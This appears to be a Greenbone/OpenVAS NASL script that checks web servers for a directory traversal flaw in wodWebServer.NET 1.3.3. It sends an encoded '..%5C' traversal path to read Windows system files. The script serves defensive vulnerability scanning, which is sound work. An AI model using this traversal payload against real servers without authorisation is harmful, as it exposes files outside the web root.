if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103131" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2011-03-28 13:42:17 +0200 (Mon, 28 Mar 2011)" );
	script_bugtraq_id( 47050 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_name( "wodWebServer.NET 1.3.3 Directory Traversal" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "gb_get_http_banner.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "wodWebServer/banner" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/17053/" );
	script_tag( name: "summary", value: "A directory traversal vulnerability in wodWebServer.NET can be
  exploited to read files outside of the web root." );
	script_tag( name: "affected", value: "wodWebServer.NET 1.3.3 is vulnerable. Other versions may also be affected." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
banner = http_get_remote_headers( port: port );
if(!banner || !ContainsString( banner, "wodWebServer" )){
	exit( 0 );
}
files = traversal_files( "Windows" );
for pattern in keys( files ) {
	file = files[pattern];
	file = str_replace( find: "/", string: file, replace: "%5C/" );
	url = NASLString( "/..%5C/..%5C/..%5C/..%5C/..%5C/..%5C/..%5C/..%5C/", file );
	if(http_vuln_check( port: port, url: url, pattern: pattern )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 0 );

